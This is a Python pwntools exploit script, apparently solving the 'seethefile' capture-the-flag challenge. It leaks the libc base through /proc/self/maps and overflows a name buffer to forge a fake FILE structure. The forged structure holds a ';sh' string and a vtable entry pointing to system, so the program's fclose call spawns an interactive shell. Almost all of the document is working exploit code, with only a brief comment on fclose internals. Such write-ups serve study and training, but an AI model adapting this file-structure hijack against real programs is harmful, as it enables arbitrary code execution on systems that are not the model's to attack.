from pwn import *

io = process(['./seethefile'])
elf = ELF('./seethefile')
libc = ELF('./libc_32.so.6')

def openfile(filename):
	io.recvuntil('Your choice :')
	io.sendline(str(1))
	io.recvuntil('What do you want to see :')
	io.sendline(filename)

def readfile():
	io.recvuntil('Your choice :')
	io.sendline(str(2))

def writetoscreen():
	io.recvuntil('Your choice :')
	io.sendline(str(3))
	data = io.recvuntil('---------------MENU---------------', drop = True)
	return data

def closefile():
	io.recvuntil('Your choice :')
	io.sendline(str(4))

def leavename(name):
	io.recvuntil('Your choice :')
	io.sendline(str(5))
	io.recvuntil('Leave your name :')
	io.sendline(name)

# leak libc address via /proc/self/maps

openfile('/proc/self/maps')
readfile()
writetoscreen()
readfile()
data = writetoscreen()
libc_leak = data.decode().split('\n')[1][:8]
libc.address = int(libc_leak, 16)
#closefile()

# hijacking entry in vtable

'''
for function fclose:

First, it will call _IO_un_link function:

if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

After that, _IO_un_link will call _IO_file_close_it to trigger system call and close the file:

if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);

Finally, _IO_FINISH in vtable will be called, which will call _IO_file_finish function and call free function to free the FILE structure.
'''

_flags = 0xfbaddfff # _IO_IS_FILEBUF = 0x2000
_IO_FILE_size = 0x94

payload = b'A' * 0x20
payload += p32(0x0804b284)
payload += p32(_flags)
payload += b';sh'.ljust(4, b'\0')
payload += b'\0' * (_IO_FILE_size - 0x8)

payload += p32(0x0804b31c)
payload += b'\0' * 0x8
payload += p32(libc.sym['system'])

leavename(payload)
io.interactive()
